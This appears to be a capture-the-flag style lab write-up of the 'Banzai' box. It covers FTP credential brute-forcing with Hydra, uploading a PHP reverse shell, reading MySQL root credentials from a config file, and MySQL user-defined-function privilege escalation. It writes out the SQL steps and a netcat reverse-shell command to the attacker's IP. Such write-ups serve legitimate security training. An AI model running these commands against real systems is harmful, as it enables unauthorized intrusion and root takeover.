---
Alias: Banzai
Date: 6/5/2022
Platform: Linux
Difficulty: Intermediate
Tags: #MYSQLuserDefinedFunctionsPrivilegeEscalation #ftpUploadReverseShell #BruteforceCommonFTPcredentialsFTPserver
Status: Finished
IP: 192.168.189.56
---

# {{Banzai}}


# Resolution summary
- Used Hydra to brute-force the FTP server with common FTP credentials.
- Discovered directories accessible through webpages
- Uploaded a PHP Reverse Shell to the FTP Server directory.
- Accessing the webpage, I clicked on the reverse shell to obtain a shell.
- Discovered the target machine's MySQL port 3306 was operating as a local host.
- Found the MySQL root credentials in the configuration file.
- I used Google to get instructions on using MYSQL User Defined Functions to escalate privileges for root privileges. 
- Acquired a root shell after following the procedure to escalate privileges.

## Improved skills
- Brute-forcing  FTP server's common credentials
- Reading config files to find credentials
- Learned privilege escalation for MySQL User Defined Functions with root privileges

## Used tools
- nmap
- gobuster

---

# Information Gathering
Scanned all TCP ports:
```bash
Nmap 7.92 scan initiated Tue Mar 15 04:10:01 2022 as: nmap --open -Pn -sV -sC -p 21,22,25,5432,8080 -oN 192.168.189.56/recon/nmap_detailed_TCP_Quick -oX 192.168.189.56/recon/xml_nmap/nmap_detailed_TCP_Quick_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.16s latency).
 
PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
22/tcp   open  ssh        OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey: 
|   2048 ba:3f:68:15:28:86:36:49:7b:4a:84:22:68:15:cc:d1 (RSA)
|   256 2d:ec:3f:78:31:c3:d0:34:5e:3f:e7:6b:77:b5:61:09 (ECDSA)
|_  256 4f:61:5c:cc:b0:1f:be:b4:eb:8f:1c:89:71:04:f0:aa (ED25519)
25/tcp   open  smtp       Postfix smtpd
|_smtp-commands: banzai.offseclabs.com, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
7
| ssl-cert: Subject: commonName=banzai
| Subject Alternative Name: DNS:banzai
| Not valid before: 2020-06-04T14:30:35
|_Not valid after:  2030-06-02T14:30:35
|_ssl-date: TLS randomness does not represent time
8080/tcp open  http       Apache httpd 2.4.25
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.25 (Debian)
Service Info: Hosts:  banzai.offseclabs.com, 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Mar 15 04:10:17 2022 -- 1 IP address (1 host up) scanned in 17.16 seconds



Nmap 7.92 scan initiated Tue Mar 15 04:09:53 2022 as: nmap --open -sS -Pn -p- -oN 192.168.189.56/recon/nmap_full -oX 192.168.189.56/recon/xml_nmap/nmap_full_xml 192.168.189.56
Nmap scan report for 192.168.189.56
Host is up (0.085s latency).
Not shown: 65528 filtered tcp ports (no-response), 1 closed tcp port (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
25/tcp   open  smtp
5432/tcp open  postgresql
8080/tcp open  http-proxy
8295/tcp open  unknown
 
# Nmap done at Tue Mar 15 04:13:29 2022 -- 1 IP address (1 host up) scanned in 216.22 seconds
```

Enumerated open TCP ports:
```bash
21
8295
3306
```

Enumerated top 200 UDP ports:
```bash

```

---

# Enumeration
## Port 8295

#### Typed "sudo gobuster dir -u http://192.168.189.56:8295 -w /usr/share/dirb/wordlists/common.txt -e -k -t50 -x "txt,html,php,asp,aspx,jsp" -o "/home/kali/Downloads/ProvingGroundsBoxes/Banzai/tcp_8295_http_common.txt" and found the following directory's I have access to:

![](Images/Pasted%20image%2020220930213106.png)

![](Images/Pasted%20image%2020221001093953.png)

## Port 21

- Based on the previous NMAP scan, port 21 (FTP) has been identified, but anonymous login is not allowed.

# Exploitation - Weak FTP credentials leading to uploading a PHP reverse shell and obtaining a foothold 

Using Hydra and common FTP credentials, we were able to brute-force our way into the FTP server. We then upload a PHP reverse shell to a directory on the FTP server.

- Access the directory "/usr/share/seclists/Passwords/ftp-betterdefaultpasslist.txt" and displayed the contents of the file. Then, saved the usernames and passwords into a new file called "ftp_common_passwords.txt".

![](Images/Pasted%20image%2020221001094042.png)
![](Images/Pasted%20image%2020221001094414.png)
![](Images/Pasted%20image%2020221001094507.png)

- Execute the command below using a password brute forcing tool called hydra and successfully identified the valid username and password combination as admin for the FTP Server.

hydra -f -C ftp_common_passwords.txt 192.168.177.56 ftp

![](Images/Pasted%20image%2020221001094549.png)

- We successfully accessed the FTP server using the credentials and discovered that the "/js" directory was accessible during the previous GoBuster scan.

![](Images/Pasted%20image%2020221001094625.png)

- Enter "lcd" command in the FTP server and discovered that we are currently in the local directory "/home/kali".
  
![](Images/Pasted%20image%2020221001094655.png)

- We create a PHP reverse shell script using a Vim file named “reverse_shell.php” on our Kali machine, which is stored in the “/home/kali” directory.

- We access the "/js" directory on the FTP server.

- We upload the reverse shell into the FTP server on directory "/js" by typing "mput reverse_shell.php".

![](Images/Pasted%20image%2020221001095230.png)

- We initiate a penelope listener via port 8080 on our Kali machine.

- We access the website at http://192.168.143.56:8295/js/.  Discovered the reverse shell uploaded on the page, clicked the link, and successfully obtained a reverse shell on the Penelope listener.

![](Images/Pasted%20image%2020221001095356.png)
![](Images/Pasted%20image%2020221001095428.png)


---


# Privilege Escalation - Readable config file leading to MySQL User-Defined Functions - Root Privileges Privilege Escalation
## Local Enumeration

- After navigating to the directory "/var/www", we discover the "config.php" file. Upon reading the file, we came across the username "root" and the password "EscalateRaftHubris123".

![](Images/Pasted%20image%2020221001095458.png)

- After running the command "netsat –tulpn," we discover that port "3306" (MySQL) is actively listening on localhost.

![](Images/Pasted%20image%2020221001095532.png)

## Port 3306

- We type "mysql –u root –p" and log in with the discovered password for mysql "EscalateRaftHubris123":

![](Images/Pasted%20image%2020221001095708.png)


## Privilege Escalation vector
## MySQL User-Defined Functions - Root Privileges 

- We search for "mysql root privilege escalation" considering we were able to log in with root in Mysql. We come across a webpage that provided a list of steps to escalate privileges.

![](Images/Pasted%20image%2020221001095752.png)
![](Images/Pasted%20image%2020221001095822.png)
![](Images/Pasted%20image%2020221001095848.png)
![](Images/Pasted%20image%2020221001095931.png)
![](Images/Pasted%20image%2020221001100004.png)
![](Images/Pasted%20image%2020221001100029.png)

- We enter the command "searchsploit -m linux/local/1518.c" to transfer the exploit onto our Kali machine.

- We set up a Python HTTP server on our Kali machine to host the "1518.c" file.

- We access the "/var/www" directory on the target machine since it had write permissions.

- We execute the command "wget [kali IP]:8295/1518.c" and successfully download the shared object file to the target machine.

- We enter the command "gcc -g -c 1518.c -o raptor_udf2.o -fPIC" followed by "gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc" to compile it into a shared object file.

 - Again we enter the command "MySQL –u root –p" and successfully log in to MySQL using the discovered password, "EscalateRaftHubris123".

![](Images/Pasted%20image%2020221001100055.png)

- We enter the command "show variables like '%plugin%';" to retrieve the current plugin directory in the database.
  
![](Images/Pasted%20image%2020221001100121.png)

- We enter the command "use mysql;"

- We enter the command "create table foo(line blob);"

- We enter the command "insert into foo values(load_file('/var/www/raptor_udf2.so'));"

- We execute the command "select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';"

- We enter the command "create function do_system returns integer soname 'raptor_udf2.so';"

- We enter the command "select * from MySQL.func;" to verify that the "raptor_udf2.so" shared object file was successfully added to the do_system function table.

![](Images/Pasted%20image%2020221001100150.png)

- We initiate a netcat listener on our Kali machine, set to listen on port 8295.

- We enter the command "select do_system('nc 192.168.49.101 8295 -e /bin/bash');" into the MySQL database on the target machine and successfully gained a root shell.

![](Images/Pasted%20image%2020221001100235.png)


---
